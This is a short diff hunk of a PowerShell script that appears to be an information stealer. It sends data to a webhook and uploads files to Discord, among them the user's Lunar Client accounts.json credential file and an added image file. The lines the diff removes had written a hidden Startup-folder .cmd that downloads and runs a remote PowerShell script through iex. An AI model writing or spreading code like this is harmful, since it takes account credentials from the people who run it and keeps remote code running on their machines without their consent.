@@ -154,17 +154,11 @@ $payload = [PSCustomObject]@{
 
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
 python C:\temp\UUID.py
-
+Upload-Discord -file "C:\temp\MicrosoftPolicy.png"
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 
 Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
 
-##### STARTUP FONCTION
-Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
-@echo off
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
-"
-##### END STARTUP FONCTION
 
 Remove-Item C:/temp
 exit  
